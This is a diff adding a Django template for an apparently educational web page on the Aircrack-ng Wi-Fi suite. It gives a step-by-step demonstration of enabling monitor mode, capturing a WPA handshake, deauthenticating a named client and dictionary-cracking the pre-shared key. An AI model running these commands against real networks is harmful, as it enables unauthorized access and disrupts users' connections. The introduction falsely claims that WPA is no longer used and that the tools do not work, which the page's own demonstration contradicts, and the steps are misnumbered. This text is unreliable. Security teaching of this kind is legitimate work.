@@ -1,0 +1,139 @@
+{% extends 'main/base.html' %}
+
+{% block tittle %}
+CSEW - Aircrack-ng
+{% endblock %}
+
+{% block content %}
+<h1>
+    <u>Aircrack-ng</u>
+</h1>
+<div class="defaultpic">
+    <img src="../../../static/media/img/aircrack.png">
+</div>
+<p>
+    A network software package called Aircrack-ng for 802.11 wireless LANs includes a detector, packet sniffer, WEP and WPA/WPA2-PSK cracker, and analysis software. It works with any wireless network interface controller whose driver can sniff 802.11a, 802.11b, and 802.11g traffic and provides raw monitoring mode. When cracking WEP and WPA/WPA2-PSK keys, Aircrack-ng employs a variety of methods. A versatile tool called Airbase-ng is intended to attack clients rather than the actual Access Point. Airdecloak-ng eliminates a packet capture file’s WEP cloaking. A wireless deactivation tool based on rules is called Airdrop-ng. The WEP protection standard is used by wireless networks, and Aircrack-ng is a great tool to utilize on those networks. The one issue is that WEP was declared obsolete in 2004. In Aircrack-ng, some routines operate on the WPA network, but that standard is no longer in use, and those utilities don’t work anyway.
+</p>
+<h2>
+    Features of Aircrack-ng:
+</h2>
+<ul>
+    <li>
+        Aircrack-ng is an open source tool.
+    </li>
+    <li>
+        Aircrack-ng tool is a very simple and easy tool.
+    </li>
+    <li>
+        Aircrack-ng tool is a complete suite of tools to assess WiFi network security.
+    </li>
+    <li>
+        Aircrack-ng tool focuses on different areas of WiFi security such as monitoring, attacking, testing and cracking.
+    </li>
+    <li>
+        Aircrack-ng tool works primarily on Linux but also Windows, macOS, FreeBSD, OpenBSD, NetBSD, as well as Solaris and even eComStation 2.
+    </li>
+</ul>
+<h2>
+    Step-by-step Demonstration of Aircrack-ng:
+</h2>
+<ul>
+    <h5>
+    <u>Step 1</u>: To get rid of any conflicting process type the following command. Make sure to type this command otherwise it may cause problems later.
+    </h5>
+    <ul>
+        <li>
+            sudo airmon-ng check kill
+        </li>
+    </ul>
+    <div class="defaultpic">
+        <img src="../../../static/media/img/a1.png">
+    </div>
+</ul>
+<ul>
+    <h5>
+    <u>Step 2</u>: Next start the wireless card aka WLAN in monitor mode, by using the following command:
+    </h5>
+    <ul>
+        <li>
+            sudo airmon-ng start wlp1s0
+        </li>
+    </ul>
+    <div class="defaultpic">
+        <img src="../../../static/media/img/a2.png">
+    </div>
+</ul>
+<ul>
+    <h5>
+    <u>Step 3</u>: Enter iwconfig to verify that the interface is properly configured.
+    </h5>
+    <ul>
+        <li>
+            iwconfig
+        </li>
+    </ul>
+    <div class="defaultpic">
+        <img src="../../../static/media/img/a3.png">
+    </div>
+</ul>
+<ul>
+    <h5>
+    <u>Step 4</u>: This is a simple test to see if your card is capable of supporting injection. Type the following command.
+    </h5>
+    <ul>
+        <li>
+            sudo aireplay-ng --test wlp1s0mon
+        </li>
+    </ul>
+    <div class="defaultpic">
+        <img src="../../../static/media/img/a4.png">
+    </div>
+</ul>
+<ul>
+    <h5>
+    <u>Step 5</u>: Now, We will use Airodump-ng to capture the traffic and 4-way authentication handshake for the target Access Point we're interested in. Enter the following command.
+    </h5>
+    <ul>
+        <li>
+            sudo airodump-ng wlp1s0mon
+        </li>
+    </ul>
+    <div class="defaultpic">
+        <img src="../../../static/media/img/a5.png">
+    </div>
+</ul>
+<ul>
+    <h5>
+    <u>Step 6</u>: Use Aireplay-ng tool to de-authenticate the client.
+    </h5>
+    <ul>
+        <li>
+            aireplay-ng --deauth 0 -a 84:D8:1B:06:EF:06 -c 04:C8:07:15:71:C0 wlp1s0mon
+        </li>
+    </ul>
+    <div class="defaultpic">
+        <img src="../../../static/media/img/a6.png">
+    </div>
+</ul>
+<ul>
+    <h5>
+    <u>Step 6</u>: Run Aircrack-ng to crack the pre-shared key. You'll need a dictionary of words as input for this. Aircrack-ng basically takes each word and checks to see if it is the pre-shared key. The rockyou.txt file, which contains a list of common passwords, can be used in this case.
+    </h5>
+    <ul>
+        <li>
+            sudo aircrack-ng -w rockyou.txt -b 84:D8:1B:06:EF:06 psk*.cap
+        </li>
+    </ul>
+    <div class="defaultpic">
+        <img src="../../../static/media/img/a7.png">
+    </div>
+</ul>
+<ul>
+    <h5>
+    <u>Step 6</u>: At this point, Aircrack-ng will attempt to decrypt the pre-shared key. This could take a long time, even days, depending on the speed of your CPU and the size of the dictionary.
+    </h5>
+    <div class="defaultpic">
+        <img src="../../../static/media/img/a8.png">
+    </div>
+</ul>
+{% endblock %}
